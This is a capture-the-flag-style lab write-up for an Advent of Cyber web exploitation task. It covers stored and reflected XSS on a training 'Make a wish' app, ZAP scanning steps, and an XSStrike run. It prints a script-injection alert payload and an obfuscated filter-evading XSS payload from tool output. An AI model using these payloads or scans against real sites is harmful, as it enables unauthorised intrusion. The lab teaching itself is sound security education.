# Day 6 - Be careful with what you wish on a Christmas night (Web Exploitation)

1. Helpful links:
    * Input validation strategies: [OWASP/CheatSheetSeries](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md)
    * Awesome guide about XSS: [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
    * Common payload list: [payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)
    * For more OWASP Zap guides, check out the following room: [Learn OWASP Zap](https://tryhackme.com/room/learnowaspzap)

2. What vulnerability type was used to exploit the application? `stored crosssite scripting`. This was referenced multiple times in the tutorial.

3. What query string can be abused to craft a reflected XSS? `q`. Inputing some data into the search box shows a `q` parameter in the URL.

4. Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan? `2`

    1. Launch OWASP ZAP, click "Automated Scan," and enter `http://10.10.157.93:5000`

    2. Press the "Attack" button.

    3. The bottom left panel will show `2` XSS (red) alerts.

5. Explore the XSS alerts that ZAP has identified, are you able to make an alert appear on the "Make a wish" website? Yes, searching for `</p><script>alert(1);</script><p>` is a reflected XSS attack. Wishing for `</p><script>alert(1);</script><p>` is a persistent/stored XSS attack since it executes on every page load.

6. Let's try [XSStrike](https://github.com/s0md3v/XSStrike).

    1. Install

        ```
        git clone https://github.com/s0md3v/XSStrike
        cd XSStrike
        sudo pip3 install -r requirements.txt
        ```

    2. Execute: `python3 xsstrike.py -u http://10.10.157.93:5000?q=a`

    3. Output

        ```
        XSStrike v3.1.4

        [~] Checking for DOM vulnerabilities 
        [+] WAF Status: Offline 
        [!] Testing parameter: q 
        [!] Reflections found: 1 
        [~] Analysing reflections 
        [~] Generating payloads 
        [!] Payloads generated: 3072 
        ------------------------------------------------------------
        [+] Payload: <htMl%0aonmOusEOvEr%0a=%0a[8].find(confirm)// 
        [!] Efficiency: 100 
        [!] Confidence: 10 
        [?] Would you like to continue scanning? [y/N]
        ```
